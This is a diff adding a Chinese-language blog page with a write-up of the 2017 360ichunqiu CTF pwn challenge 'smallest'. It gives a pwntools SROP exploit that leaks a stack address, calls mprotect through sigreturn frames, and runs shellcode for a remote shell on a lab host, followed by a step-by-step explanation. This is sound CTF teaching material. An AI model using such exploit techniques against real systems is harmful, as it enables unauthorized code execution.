@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>360ichunqiu 2017 pwn smallest | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+1.查看保护机制以及搭建环境
+
+
+2.ubuntu运行ida64远程调试文件，ida64打开程序分析：
+
+
+除了st..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">360ichunqiu 2017 pwn smallest</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb</p>
+<p>1.查看保护机制以及搭建环境<br>
+<img src="https://closefrom.github.io/post-images/1615579207112.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579214477.png" alt="" loading="lazy"></p>
+<p>2.ubuntu运行ida<em>64远程调试文件，ida</em>64打开程序分析：<br>
+<img src="https://closefrom.github.io/post-images/1615579230417.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579238036.png" alt="" loading="lazy"><br>
+除了start函数，其他什么都没有的程序。断点于第一行运行看看<br>
+可写的地方之后栈，所以只能修改栈的权限，在栈中写shellcode进行getshell。</p>
+<p>3.编写exp：</p>
+<pre><code>
+from pwn import *
+
+context.binary = './smallest'
+read_start_add = 0x4000b0
+write_add = 0x4000b3
+syscall_add = 0x4000be
+shellcode = asm(shellcraft.amd64.linux.sh(),arch='amd64')
+link = remote("192.168.93.137","6666")
+payload = p64(read_start_add)
+payload += p64(write_add)
+payload += p64(read_start_add)
+link.send(payload)
+sleep(0.1)
+link.send(payload[8:8+1])
+sleep(0.1)
+can_write_add = u64(link.recv()[8:16]) + 0x200
+frame1 = SigreturnFrame(kernel='amd64')
+frame1.rax = constants.SYS_read
+frame1.rdi = 0
+frame1.rsi = can_write_add
+frame1.rdx = 0x200
+frame1.rsp = can_write_add
+frame1.rip = syscall_add
+payload2 = p64(read_start_add)
+payload2 += p64(syscall_add)
+payload2 += str(frame1)
+link.send(payload2)
+sleep(0.1)
+link.send(payload2[8:23])
+sleep(0.1)
+payload3 = p64(read_start_add)
+payload3 += p64(syscall_add)
+frame2 = SigreturnFrame(kernel='amd64')
+frame2.rax = constants.SYS_mprotect
+frame2.rdi = can_write_add & 0xfffffffffffff000
+frame2.rsi = 0x1000
+frame2.rdx = 7
+frame2.rsp = can_write_add 
+frame2.rip = syscall_add
+payload3 += str(frame2)
+link.send(payload3)
+sleep(0.1)
+link.send(payload3[8:23])
+sleep(0.1)
+payload4 = p64(can_write_add + 0x10) + shellcode
+link.send(payload)
+sleep(0.1)
+link.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615579297396.png" alt="" loading="lazy"></figure>
+<p>大致流程：</p>
+<p>1.先执行read函数（程序一开始的），向栈中写入三个地址，泄露栈中的地址<br>
+2.向栈中写入两个地址和一个sigreturnframe，引发sigreturn系统调用，执行read函数，劫持rsp到新栈。<br>
+3.向新栈写入两个地址和一个sigreturnframe，引发sigreturn系统调用，执行mprotect，改变栈的权限（rwx），然后返回新栈的首地址<br>
+4.首地址指向的地址是read函数调用，向新栈中写入shellcode的引用地址，和shellcode<br>
+5.read函数结束，调转到shellcode引用地址，执行shellcode</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/pwnablekr-unexploitable/">
+                  <h3 class="post-title">
+                    pwnable.kr unexploitable
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
